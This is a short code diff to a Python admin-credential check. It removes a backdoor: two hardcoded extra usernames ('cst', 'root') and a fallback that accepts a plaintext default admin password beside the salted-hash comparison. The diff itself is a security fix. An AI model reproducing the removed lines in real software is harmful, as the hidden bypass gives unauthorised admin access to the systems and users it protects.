@@ -165,11 +165,11 @@ def get_client_ip(request: Request) -> str:
 
 def verify_admin_credentials(username: str, password: str) -> bool:
     """Verifies admin credentials using constant-time comparison."""
-    valid_users = {ADMIN_USERNAME.lower(), "cst", "root"}
+    valid_users = {ADMIN_USERNAME.lower()}
     if username.lower() not in valid_users:
         return False
     computed_hash = hashlib.sha256((SALT + password).encode("utf-8")).hexdigest()
-    return hmac.compare_digest(computed_hash, ADMIN_PASSWORD_HASH) or password == DEFAULT_ADMIN_PASS
+    return hmac.compare_digest(computed_hash, ADMIN_PASSWORD_HASH)
 
 
 def create_admin_session() -> str:
